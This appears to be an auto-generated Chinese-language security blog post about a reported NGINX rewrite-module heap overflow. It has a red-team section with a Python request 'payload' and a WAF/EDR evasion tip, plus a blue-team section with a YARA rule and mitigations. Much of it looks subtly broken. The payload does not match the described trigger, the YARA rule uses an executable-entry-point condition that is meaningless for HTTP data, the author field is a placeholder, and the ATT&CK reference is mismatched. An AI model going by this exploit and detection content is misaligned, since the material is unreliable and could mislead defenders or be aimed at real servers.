---
layout: post
title:  "18-Year-Old NGINX Rewrite Module Flaw Enables Unauthenticated RCE"
date:   2026-05-14 08:30:40 +0000
categories: [security]
severity: critical
---

# 🚨 NGINX Rewrite Module 漏洞解析：利用與防禦技術

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS v4 score: 9.2)
> * **受駭指標**: Remote Code Execution (RCE)
> * **關鍵技術**: Heap Buffer Overflow, Perl-Compatible Regular Expression (PCRE)

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)

* **Root Cause**: NGINX 的 `ngx_http_rewrite_module` 中存在一個堆緩衝區溢出漏洞，當使用未命名的 PCRE 捕獲（例如 `$1`, `$2`）並包含一個問號 (`?`) 時，會導致堆緩衝區溢出。
* **攻擊流程圖解**:
  1. User Input -> `ngx_http_rewrite_module` 處理
  2. `ngx_http_rewrite_module` 中的 PCRE 捕獲處理
  3. 問號 (`?`) 引起的堆緩衝區溢出
* **受影響元件**: NGINX Plus 和 NGINX Open Source 的 `ngx_http_rewrite_module` 模組

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)

* **攻擊前置需求**: 無需驗證，僅需能夠發送 HTTP 請求
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 建構 Payload
    payload = "/?{}{}".format("A" * 1000, "?")
    
    # 發送 HTTP 請求
    response = requests.get("http://example.com" + payload)
    
    # 檢查是否成功
    if response.status_code == 500:
        print("Heap Buffer Overflow 成功")
    
    ```
* **繞過技術**: 可以使用 URL 編碼或其他技術來繞過 WAF 或 EDR 的檢測

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)

* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
|  |  | example.com | /var/log/nginx/error.log |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule NGINX_Heap_Buffer_Overflow {
        meta:
            description = "NGINX Heap Buffer Overflow"
            author = "Your Name"
        strings:
            $a = { 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 3f }
        condition:
            $a at @entry(0)
    }
    
    ```
* **緩解措施**: 更新 NGINX 至最新版本，或修改 `nginx.conf` 中的 `rewrite` 指令以使用命名的 PCRE 捕獲

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)

* **Heap Buffer Overflow**: 堆緩衝區溢出是一種安全漏洞，當程式嘗試寫入超出堆緩衝區大小的資料時，會導致堆緩衝區溢出，可能導致程式崩潰或執行任意代碼。
* **Perl-Compatible Regular Expression (PCRE)**: PCRE 是一種正則表達式引擎，廣泛用於各種程式語言和應用中。
* **Address Space Layout Randomization (ASLR)**: ASLR 是一種安全技術，通過隨機化程式的記憶體佈局來防止攻擊者預測記憶體地址。

## 5. 🔗 參考文獻與延伸閱讀

* [原始報告](https://thehackernews.com/2026/05/18-year-old-nginx-rewrite-module-flaw.html)
* [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


